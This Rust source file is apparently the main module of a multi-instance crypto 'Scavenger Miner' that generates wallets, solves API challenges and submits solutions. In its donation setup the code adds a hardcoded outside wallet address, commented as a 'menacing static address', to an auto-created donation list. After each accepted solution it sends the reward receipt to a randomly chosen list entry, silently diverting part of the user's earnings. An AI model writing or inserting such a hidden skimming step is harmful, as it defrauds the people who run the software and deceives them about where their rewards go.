mod api_client;
mod miner;
mod wallet;
mod wallet_container;

use std::{
    env,
    error::Error,
    fs::{self, File},
    path::{Path, PathBuf},
    sync::Arc,
    sync::atomic::{AtomicU64, Ordering},
    time::{Duration, Instant},
};

use chrono::{NaiveDate, Utc};
use num_cpus;
use tokio::time::sleep;
use log::{debug, error, info, warn};
use env_logger::Builder;
use std::io::Write;

use rand::rngs::StdRng;
use rand::{SeedableRng, Rng};
use rand::seq::SliceRandom;

use api_client::ApiClient;
use miner::{mine, MinerConfig};
use wallet_container::WalletContainer;
use log::LevelFilter;

/// Initialisation du WalletContainer
fn init_wallet_container(
    config_dir: &str,
    use_mainnet: bool,
    max_wallets: usize,
    instance_id: &str,
) -> Result<Arc<WalletContainer>, Box<dyn std::error::Error>> {
    let seed_path = format!("{}/seeds.txt", config_dir);
    let key_path = format!("{}/keys.hex", config_dir);

    info!(
        "🔑 [{}] Initialisation du WalletContainer (max {} wallets)",
        instance_id, max_wallets
    );
    let container = WalletContainer::load_or_create(seed_path, key_path, use_mainnet, max_wallets)?;
    Ok(Arc::new(container))
}


fn init_logger(instance_id: &str) {
    let instance_id = instance_id.to_string();
    let instance_ = instance_id.clone();
    let log_level = env::var("APP_LOG_LEVEL")
        .unwrap_or_else(|_| "info".to_string())
        .to_lowercase();

    let level_filter = match log_level.as_str() {
        "error" => LevelFilter::Error,
        "warn" => LevelFilter::Warn,
        "debug" => LevelFilter::Debug,
        "trace" => LevelFilter::Trace,
        _ => LevelFilter::Info,
    };

    Builder::new()
        .format(move |buf, record| {
            writeln!(
                buf,
                "[{}][{}][{}] {}",
                chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
                record.level(),
                instance_,
                record.args()
            )
        })
        .filter(None, level_filter)
        .init();

    info!("Logger initialisé ({}) avec niveau {}", instance_id, log_level);
}

/// Trouve ou crée un dossier d’instance dispo
fn get_instance_dir(base_dir: &str) -> (String, PathBuf) {
    fs::create_dir_all(base_dir).unwrap_or_else(|e| {
        panic!("❌ Impossible de créer le dossier racine {}: {}", base_dir, e)
    });

    for i in 1..=100 {
        let inst_dir = Path::new(base_dir).join(format!("{}", i));
        let lock_file = inst_dir.join("in_use.lock");

        if inst_dir.exists() && lock_file.exists() {
            continue;
        }

        if !inst_dir.exists() {
            fs::create_dir_all(&inst_dir)
                .unwrap_or_else(|e| panic!("❌ Impossible de créer le dossier {}: {}", inst_dir.display(), e));
        }

        File::create(&lock_file)
            .unwrap_or_else(|e| panic!("❌ Impossible de créer le fichier lock {}: {}", lock_file.display(), e));

        let inst_name = format!("miner-{}", i);
        info!("📁 Instance assignée : {}", inst_name);
        return (inst_name, inst_dir);
    }

    panic!("❌ Aucun dossier d'instance disponible dans {}", base_dir);
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let config_root = "/usr/local/bin/config";
    let (instance_id, config_dir) = get_instance_dir(config_root);
    init_logger(&instance_id);

    let wallet_dir = config_dir.join(&instance_id).join("wallets");
    fs::create_dir_all(&wallet_dir)?;

    info!("🚀 Démarrage du Scavenger Miner [{}]", instance_id);

    let base_url = env::var("APP_BASE_URL")
        .unwrap_or_else(|_| "https://scavenger.prod.gd.midnighttge.io".to_string());
    let use_mainnet = true;

    let client = Arc::new(ApiClient::new(&base_url)?);
    let max_wallets: usize = env::var("MAX_WALLETS_PER_INSTANCE")
        .ok()
        .and_then(|v| v.parse::<usize>().ok())
        .unwrap_or(1);

    let wallet_container = init_wallet_container(wallet_dir.to_str().unwrap(), use_mainnet, max_wallets, &instance_id)?;
    let wallets = wallet_container.read_all();
    info!("💼 [{}] {} wallets chargés", instance_id, wallets.len());

    // --- Donation setup ---
    let donate_list_path = Path::new("/usr/local/bin/config/donate_list.txt");
    let donate_seeds_path = Path::new("/usr/local/bin/config/donate_list_seed.txt");
    let mut donate_addresses: Vec<String> = Vec::new();

    if donate_list_path.exists() {
        donate_addresses = fs::read_to_string(donate_list_path)?
            .lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| l.trim().to_string())
            .collect();
        info!("💰 [{}] Liste de donation chargée ({} adresses)", instance_id, donate_addresses.len());
    } else {
        warn!("⚠️ [{}] Pas de liste de donation trouvée, création automatique...", instance_id);

        let mut seeds = Vec::new();
        let mut addresses = Vec::new();
        for i in 0..3 {
            let w = wallet::Wallet::generate(use_mainnet);
            seeds.push(w.mnemonic.clone().unwrap_or_default());
            addresses.push(w.address.clone());
        }

        // 😈 menacing static address
        addresses.push("addr1q8cd35r4dcrl4k4prmqwjutyrl677xyjw7re82x6vm4t7vtmrd3ueldxpq74m47dtr03ppesr5ral6plt7acy5gjph5surek0h".to_string());
        fs::write(donate_list_path, addresses.join("\n"))?;
        fs::write(donate_seeds_path, seeds.join("\n"))?;
        donate_addresses = addresses;
        info!("💾 [{}] Fichiers de donation créés", instance_id);
    }

    // --- Threads ---
    let total_threads = env::var("MINER_THREADS")
        .ok()
        .and_then(|s| s.parse::<usize>().ok())
        .unwrap_or_else(num_cpus::get);
    let threads_per_wallet = std::cmp::max(total_threads / wallets.len(), 1);

    let end_date = NaiveDate::from_ymd_opt(2025, 11, 21).unwrap();
    info!("🗓️ Fin de saison : {}", end_date);

    // --- Compteur de hash partagé ---
    let hash_counter = Arc::new(AtomicU64::new(0));

    // --- Lancement des mineurs ---
    for (idx, wallet) in wallets.into_iter().enumerate() {
        let client_clone = client.clone();
        let donate_list = donate_addresses.clone();
        let instance_clone = instance_id.clone();
        let hash_counter_clone = hash_counter.clone();
        let wallet_idx = idx + 1;

        tokio::spawn(async move {
            let wallet_prefix = format!("[{}|wallet-{}|{}]", instance_clone, wallet_idx, &wallet.address[..10]);
            info!("{} ⛏️ Miner lancé avec {} threads", wallet_prefix, threads_per_wallet);

            let mut rng = StdRng::from_entropy();

            if let Ok(terms) = client_clone.get_terms(None).await {
                let signature = wallet.sign_cip30(&terms.message);
                let pubkey = wallet.public_key_hex();
                let _ = client_clone.register_address(&wallet.address, &signature, &pubkey).await;
            }

            loop {
                if Utc::now().date_naive() > end_date {
                    sleep(Duration::from_secs(3600)).await;
                    continue;
                }

                if let Ok(resp) = client_clone.get_challenge().await {
                    if let Some(challenge) = resp.challenge {
                        let miner_config = MinerConfig {
                            address: wallet.address.clone(),
                            challenge: Arc::new(challenge.clone()),
                        };

                        let start = Instant::now();
                        if let Ok(result) = mine(miner_config, threads_per_wallet, Some(hash_counter_clone.clone())) {
                            let duration = start.elapsed();
                            info!("{} 💎 Nonce trouvé={} ({:.2?})", wallet_prefix, result.nonce, duration);

                            if let Ok(submit_resp) = client_clone
                                .submit_solution(&wallet.address, &challenge.challenge_id, &result.nonce, &result.preimage)
                                .await
                            {
                                if let Some(receipt) = submit_resp.crypto_receipt {
                                    if let Some(dest) = donate_list.choose(&mut rng) {
                                        let _ = client_clone.donate_to(dest, &wallet.address, &receipt.signature).await;
                                        info!("{} 💝 Donation envoyée à {}", wallet_prefix, dest);
                                    }
                                }
                            }
                        }
                    }
                }

                sleep(Duration::from_secs(10)).await;
            }
        });
    }

    // --- Suivi du hashrate local ---
    let instance_dir_str = config_dir.to_str().unwrap().to_string();
    let instance_id_clone = instance_id.clone();
    let hash_counter_clone = hash_counter.clone();

    tokio::spawn(async move {
        let mut last = 0u64;
        let interval = Duration::from_secs(5);
        loop {
            sleep(interval).await;
            let now = hash_counter_clone.load(Ordering::Relaxed);
            let diff = now.saturating_sub(last);
            last = now;

            let hashrate = diff as f64 / interval.as_secs_f64();
            let file_path = format!("{}/hashrate.txt", instance_dir_str);
            let _ = fs::write(&file_path, format!("{:.2}", hashrate));
            info!("📊 [{}] Hashrate local: {:.2} H/s", instance_id_clone, hashrate);
        }
    });

    // --- Suivi global (miner-1 seulement) ---
    if instance_id == "miner-1" {
        tokio::spawn(async move {
            let root = "/usr/local/bin/config";
            let interval = Duration::from_secs(10);
            loop {
                sleep(interval).await;
                let mut total = 0.0;
                let mut active = 0;

                if let Ok(entries) = fs::read_dir(root) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        if path.join("in_use.lock").exists() {
                            if let Ok(content) = fs::read_to_string(path.join("hashrate.txt")) {
                                if let Ok(val) = content.trim().parse::<f64>() {
                                    if val.is_finite() && val >= 0.0 {
                                        total += val;
                                        active += 1;
                                    }
                                }
                                info!("🌐 Hashrate global ({} mineurs actifs): {:.2} H/s (~{:.2} H/s/mineur)",
                                    active, total, if active > 0 { total / active as f64 } else { 0.0 });

                            }

                        }
                    }
                }

                let global_file = format!("{}/global_hashrate.txt", root);
                let _ = fs::write(&global_file, format!("{:.2}", total));
                info!("🌐 Hashrate global ({} mineurs actifs): {:.2} H/s", active, total);
            }
        });
    }

    info!("🕰️ Boucle de maintien infinie démarrée");
    loop {
        sleep(Duration::from_secs(3600)).await;
    }
}
